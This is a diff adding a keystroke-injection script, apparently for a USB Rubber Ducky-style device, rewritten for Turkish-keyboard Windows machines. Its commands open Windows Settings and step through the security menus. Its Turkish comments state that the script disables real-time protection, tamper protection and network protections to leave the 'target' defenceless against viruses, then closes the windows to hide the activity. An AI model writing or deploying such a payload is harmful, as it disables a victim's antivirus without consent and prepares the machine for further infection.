@@ -1,0 +1,99 @@
+REM Author      : https://github.com/Alperencode
+REM Bu programı türkçe klavye kullanan bilgisarlarda çalışması için yeniden yazdım
+REM Hedef bilgisayarın kalitesi standartların altında ise delay sürelerini uzatabilirsiniz
+DELAY 1000
+CTRL ESC
+DELAY 250
+STRING ayarlar
+DELAY 350
+ENTER
+DELAY 650
+TAB
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+RIGHT
+DELAY 100
+RIGHT
+DELAY 100
+ENTER
+DELAY 500
+TAB
+DELAY 100
+DOWN
+DELAY 100
+DOWN
+DELAY 100
+ENTER
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+ENTER
+DELAY 500
+SPACE
+DELAY 100
+TAB
+DELAY 100
+SPACE
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+TAB
+DELAY 100
+SPACE
+REM herhangi bir virüs'e karşı koymaması için gerçek zamanlı koruma ve kurcalamaya karşı koyma gibi önlemleri kapattık
+REM bundan sonrasında hedefi tamamen zafiyetli hale getirmek için ağ korumalarını da kapatıyoruz
+DELAY 100
+LEFT
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+ENTER
+DELAY 100
+LEFT
+DELAY 100
+RIGHT
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+UP
+DELAY 100
+ENTER
+DELAY 100
+TAB
+DELAY 100
+SPACE
+REM Bütün korumaları kapattık ve hedef tamamen korumasız bir durumda, aşağıdaki satırlarda programın açtığı her şeyi kapatıyoruz
+DELAY 100
+ALT F4
+DELAY 250
+ALT F4
+DELAY 250
+ALT F4
+REM programın bu delay'ler ile çalışma süresi 9.50 saniye ingilizce klavyeye kıyasla 3 saniye gecikmesi var
